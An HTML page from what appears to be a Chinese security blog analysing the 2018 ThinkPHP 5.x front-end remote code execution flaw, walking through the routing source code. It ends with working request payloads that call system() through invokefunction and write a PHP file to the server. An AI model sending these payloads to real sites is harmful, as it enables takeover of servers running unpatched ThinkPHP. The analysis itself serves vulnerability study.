@@ -1,0 +1,503 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content>
+    <meta name="keyword" content>
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+          ThinkPHP5.x 前台getshell分析 - Kingkk&#39;s Blog
+        
+    </title>
+
+    <link rel="canonical" href="https://www.kingkk/2018/12/ThinkPHP5-x-前台getshell分析/">
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/hux-blog.min.css">
+
+    <!-- Pygments Highlight CSS -->
+    <link rel="stylesheet" href="/css/highlight.css">
+
+    <!-- Custom Fonts -->
+    <!-- <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
+    <!-- Hux change font-awesome CDN to qiniu -->
+    <link href="https://cdn.staticfile.org/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+
+    <!-- Hux Delete, sad but pending in China
+    <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/
+    css'>
+    -->
+
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="">
+
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Kingkk&#39;s Blog</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+
+                    
+
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/about/">About</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/archives/">Archives</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/tags/">Tags</a>
+                        </li>
+                        
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+    <!-- Main Content -->
+    
+<!-- Image to hack wechat -->
+<!-- <img src="https://www.kingkk/img/icon_wechat.png" width="0" height="0"> -->
+<!-- <img src="{{ site.baseurl }}/{% if page.header-img %}{{ page.header-img }}{% else %}{{ site.header-img }}{% endif %}" width="0" height="0"> -->
+
+<!-- Post Header -->
+<style type="text/css">
+    header.intro-header{
+        background-image: url('/img/home-bg.jpg')
+    }
+</style>
+<header class="intro-header" >
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                          <a class="tag" href="/tags/#漏洞分析" title="漏洞分析">漏洞分析</a>
+                        
+                          <a class="tag" href="/tags/#ThinkPHP" title="ThinkPHP">ThinkPHP</a>
+                        
+                    </div>
+                    <h1>ThinkPHP5.x 前台getshell分析</h1>
+                    <h2 class="subheading"></h2>
+                    <span class="meta">
+                        Posted by kingkk on
+                        2018-12-11
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+    <!-- Post Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>昨晚微博刷着刷着看到一个无条件的ThinkPHP5.x通杀前台getshell，然后群里面师傅们也都在讨论这件事了。感觉是个TP5写的站都是通杀，怕是一场腥风血雨。。。</p>
+<p>官方给出的补丁，可以看到是路由上面出的问题，怪不得通杀。</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/ThinkPHP5-x-前台getshell分析/1.png" alt></p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>分析版本 ThinkPHP 5.1.30</p>
+<h2 id="路由调用"><a href="#路由调用" class="headerlink" title="路由调用"></a>路由调用</h2><p>先从<code>thinkphp/library/think/route/dispatch/Url.php:20</code>看起</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 解析默认的URL规则</span></span><br><span class="line">    $result = <span class="keyword">$this</span>-&gt;parseUrl(<span class="keyword">$this</span>-&gt;dispatch);</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">new</span> Module(<span class="keyword">$this</span>-&gt;request, <span class="keyword">$this</span>-&gt;rule, $result))-&gt;init();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>init</code>中进行了url解析然后将返回值赋值给<code>$result</code>，然后再传入到<code>Module</code>的<code>init()</code>中。</p>
+<p>先来到解析url的部分，可以一直跟进到<code>thinkphp/library/think/route/Rule.php:947</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">parseUrlPath</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 分隔符替换 确保路由定义使用统一的分隔符</span></span><br><span class="line">    $url = str_replace(<span class="string">'|'</span>, <span class="string">'/'</span>, $url);</span><br><span class="line">    $url = trim($url, <span class="string">'/'</span>);</span><br><span class="line">    $var = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">false</span> !== strpos($url, <span class="string">'?'</span>)) &#123;</span><br><span class="line">        <span class="comment">// [模块/控制器/操作?]参数1=值1&amp;参数2=值2...</span></span><br><span class="line">        $info = parse_url($url);</span><br><span class="line">        $path = explode(<span class="string">'/'</span>, $info[<span class="string">'path'</span>]);</span><br><span class="line">        parse_str($info[<span class="string">'query'</span>], $var);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (strpos($url, <span class="string">'/'</span>)) &#123;</span><br><span class="line">        <span class="comment">// [模块/控制器/操作]</span></span><br><span class="line">        $path = explode(<span class="string">'/'</span>, $url);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (<span class="keyword">false</span> !== strpos($url, <span class="string">'='</span>)) &#123;</span><br><span class="line">        <span class="comment">// 参数1=值1&amp;参数2=值2...</span></span><br><span class="line">        $path = [];</span><br><span class="line">        parse_str($url, $var);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $path = [$url];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> [$path, $var];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到是单纯的根据<code>/</code>来进行分割，也就意味着其中可以插入一些自定义的字符。</p>
+<p>最后返回一个这样的<code>[$module, $controller, $action]</code>数组</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/ThinkPHP5-x-前台getshell分析/2.png" alt></p>
+<p>在<code>Module</code>初始化的时候，就会将<code>$result</code>数组赋值到<code>$this-&gt;dispatch</code>变量中</p>
+<p>然后来到<code>Module</code>的<code>init()</code>方法</p>
+<p><code>thinkphp/library/think/route/dispatch/Module.php:27</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">parent</span>::init();</span><br><span class="line"></span><br><span class="line">    $result = <span class="keyword">$this</span>-&gt;dispatch;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (is_string($result)) &#123;</span><br><span class="line">        $result = explode(<span class="string">'/'</span>, $result);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	.....</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 是否自动转换控制器和操作名</span></span><br><span class="line">    $convert = is_bool(<span class="keyword">$this</span>-&gt;convert) ? <span class="keyword">$this</span>-&gt;convert : <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">'url_convert'</span>);</span><br><span class="line">    <span class="comment">// 获取控制器名</span></span><br><span class="line">    $controller       = strip_tags($result[<span class="number">1</span>] ?: <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">'default_controller'</span>));</span><br><span class="line">    <span class="keyword">$this</span>-&gt;controller = $convert ? strtolower($controller) : $controller;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取操作名</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;actionName = strip_tags($result[<span class="number">2</span>] ?: <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">'default_action'</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置当前请求的控制器、操作</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;request</span><br><span class="line">        -&gt;setController(Loader::parseName(<span class="keyword">$this</span>-&gt;controller, <span class="number">1</span>))</span><br><span class="line">        -&gt;setAction(<span class="keyword">$this</span>-&gt;actionName);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到<code>$this-&gt;controller</code>和<code>$this-&gt;actionName</code>是从变量<code>$result</code>值而来的</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$controller       = strip_tags($result[<span class="number">1</span>] ?: <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">'default_controller'</span>));</span><br><span class="line"><span class="keyword">$this</span>-&gt;controller = $convert ? strtolower($controller) : $controller;</span><br><span class="line"><span class="keyword">$this</span>-&gt;actionName = strip_tags($result[<span class="number">2</span>] ?: <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">'default_action'</span>));</span><br></pre></td></tr></table></figure>
+<p>而这<code>$result</code>的值是由<code>$this-&gt;dispatch</code>的值而来的。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$result = <span class="keyword">$this</span>-&gt;dispatch;</span><br></pre></td></tr></table></figure>
+<p>到了这里，漏洞也就差不多出来了，由于获取<code>$controller</code>和<code>$action</code>时没有进行什么检验，后面就是常规的调用类触发方法。</p>
+<p>导致可以调用任意类的任意方法。只要找到几个存在危险函数调用的地方，就可以深度利用这个漏洞。</p>
+<h2 id="寻找触发点"><a href="#寻找触发点" class="headerlink" title="寻找触发点"></a>寻找触发点</h2><p>触发点似乎有蛮多的，就挑几个说一下</p>
+<h3 id="think-Container-invokefunction"><a href="#think-Container-invokefunction" class="headerlink" title="\think\Container invokefunction"></a>\think\Container invokefunction</h3><p><code>thinkphp/library/think/Container.php:340</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">invokeFunction</span><span class="params">($function, $vars = [])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        $reflect = <span class="keyword">new</span> ReflectionFunction($function);</span><br><span class="line">        $args = <span class="keyword">$this</span>-&gt;bindParams($reflect, $vars);</span><br><span class="line">        <span class="keyword">return</span> call_user_func_array($function, $args);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ReflectionException $e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">'function not exists: '</span> . $function . <span class="string">'()'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以直接看到<code>call_user_func_array</code>的调用，传入对应的<code>$function</code>和<code>$var</code>即可</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">s=index/\think\Container/invokefunction</span><br><span class="line">&amp;function=call<span class="emphasis">_user_</span>func_array</span><br><span class="line">&amp;vars[0]=system</span><br><span class="line">&amp;vars[<span class="string">1</span>][<span class="symbol"></span>]=dir</span><br></pre></td></tr></table></figure>
+<h3 id="think-template-driver-File-write"><a href="#think-template-driver-File-write" class="headerlink" title="\think\template\driver\File  write"></a>\think\template\driver\File  write</h3><p><code>thinkphp/library/think/template/driver/File.php:27</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">($cacheFile, $content)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 检测模板目录</span></span><br><span class="line">    $dir = dirname($cacheFile);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!is_dir($dir)) &#123;</span><br><span class="line">        mkdir($dir, <span class="number">0755</span>, <span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 生成模板缓存文件</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">false</span> === file_put_contents($cacheFile, $content)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">'cache write error:'</span> . $cacheFile, <span class="number">11602</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s=index/\think\template\driver\File/write</span><br><span class="line">&amp;cacheFile=<span class="number">1.</span>php</span><br><span class="line">&amp;content=<span class="meta">&lt;?</span>=phpinfo();</span><br></pre></td></tr></table></figure>
+<p>就会生成一个<code>1.php</code>的文件</p>
+<h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>可以调用的类还是相当多的，今天网上一搜，好多站都已经是马场了，惨惨惨。。。</p>
+<p>后来知道5.0和5.1以及linux和win有点差异，放一个通用的payload</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">index.php</span><br><span class="line">?s=index/\think\app/invokefunction</span><br><span class="line">&amp;function=call<span class="emphasis">_user_</span>func_array</span><br><span class="line">&amp;vars[0]=system</span><br><span class="line">&amp;vars[<span class="string">1</span>][<span class="symbol"></span>]=dir</span><br></pre></td></tr></table></figure>
+
+
+                <hr>
+
+                
+
+                <ul class="pager">
+                    
+                        <li class="previous">
+                            <a href="/2019/01/Java反序列之从萌新到菜鸟/" data-toggle="tooltip" data-placement="top" title="Java反序列之从萌新到菜鸟">&larr; Previous Post</a>
+                        </li>
+                    
+                    
+                        <li class="next">
+                            <a href="/2018/11/Code-Breaking-Puzzles-题解-学习篇/" data-toggle="tooltip" data-placement="top" title="Code-Breaking Puzzles 题解&学习篇">Next Post &rarr;</a>
+                        </li>
+                    
+                </ul>
+
+                
+
+                
+
+            </div>
+    <!-- Side Catalog Container -->
+        
+
+    <!-- Sidebar Container -->
+
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                       
+                          <a class="tag" href="/tags/#漏洞分析" title="漏洞分析">漏洞分析</a>
+                        
+                          <a class="tag" href="/tags/#ThinkPHP" title="ThinkPHP">ThinkPHP</a>
+                        
+                    </div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+                <hr>
+                <h5>FRIENDS</h5>
+                <ul class="list-inline">
+
+                    
+                        <li><a href="//98587329.github.io" target="_blank">mt</a></li>
+                    
+                        <li><a href="//www.cflowerth.com" target="_blank">FAtwAER</a></li>
+                    
+                        <li><a href="//lufe1.cn" target="_blank">lufei</a></li>
+                    
+                        <li><a href="//0x3f97.github.io" target="_blank">gd</a></li>
+                    
+                        <li><a href="http://www.lsafe.org" target="_blank">4dmin$5</a></li>
+                    
+                        <li><a href="http://www.thekingofnight.com/" target="_blank">theKingOfNight</a></li>
+                    
+                        <li><a href="http://www.thekingofnight.com/" target="_blank">Hpdoger</a></li>
+                    
+                        <li><a href="//mochazz.github.io/" target="_blank">七月火</a></li>
+                    
+                        <li><a href="https://mengsec.com/" target="_blank">蒙尘</a></li>
+                    
+                        <li><a href="https://patrilic.top/" target="_blank">Patrilic&#39;s Blog</a></li>
+                    
+                </ul>
+                
+            </div>
+
+        </div>
+    </div>
+</article>
+
+
+
+
+
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script>
+    async("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js",function(){
+        anchors.options = {
+          visible: 'always',
+          placement: 'right',
+          icon: '#'
+        };
+        anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+    })
+</script>
+<style>
+    /* place left on bigger screen */
+    @media all and (min-width: 800px) {
+        .anchorjs-link{
+            position: absolute;
+            left: -0.75em;
+            font-size: 1.1em;
+            margin-top : -0.1em;
+        }
+    }
+</style>
+
+
+
+    <!-- Footer -->
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                
+                
+                
+
+                
+
+                
+
+                
+                    <li>
+                        <a target="_blank"  href="https://github.com/kingkaki">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; Kingkk&#39;s Blog 2019 
+                    <br>
+                    Theme by <a href="http://huangxuan.me">Hux</a> 
+                    <span style="display: inline-block; margin: 0 5px;">
+                        <i class="fa fa-heart"></i>
+                    </span> 
+                    Ported by <a href="http://blog.kaijun.rocks">Kaijun</a> <!-- | 
+                    <iframe
+                        style="margin-left: 2px; margin-bottom:-5px;"
+                        frameborder="0" scrolling="0" width="91px" height="20px"
+                        src="https://ghbtns.com/github-btn.html?user=kaijun&repo=hexo-theme-huxblog&type=star&count=true" >
+                    </iframe>
+                    -->
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+<script src="/js/jquery.min.js"></script>
+
+<!-- Bootstrap Core JavaScript -->
+<script src="/js/bootstrap.min.js"></script>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/hux-blog.min.js"></script>
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!-- 
+     Because of the native support for backtick-style fenced code blocks 
+     right within the Markdown is landed in Github Pages, 
+     From V1.6, There is no need for Highlight.js, 
+     so Huxblog drops it officially.
+
+     - https://github.com/blog/2100-github-pages-now-faster-and-simpler-with-jekyll-3-0  
+     - https://help.github.com/articles/creating-and-highlighting-code-blocks/    
+-->
+<!--
+    <script>
+        async("http://cdn.bootcss.com/highlight.js/8.6/highlight.min.js", function(){
+            hljs.initHighlightingOnLoad();
+        })
+    </script>
+    <link href="http://cdn.bootcss.com/highlight.js/8.6/styles/github.min.css" rel="stylesheet">
+-->
+
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("https://www.kingkk/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+<!-- Google Analytics -->
+
+
+
+
+<!-- Baidu Tongji -->
+
+<script>
+    // dynamic User by Hux
+    var _baId = '2095437387a20021fd7e176e0c1aac8b';
+
+    // Originial
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?" + _baId;
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+
+
+<!-- Side Catalog -->
+
+
+
+
+
+<!-- Image to hack wechat -->
+<img src="https://www.kingkk/img/icon_wechat.png" width="0" height="0" />
+<!-- Migrate from head to bottom, no longer block render and still work -->
+
+</body>
+
+</html>
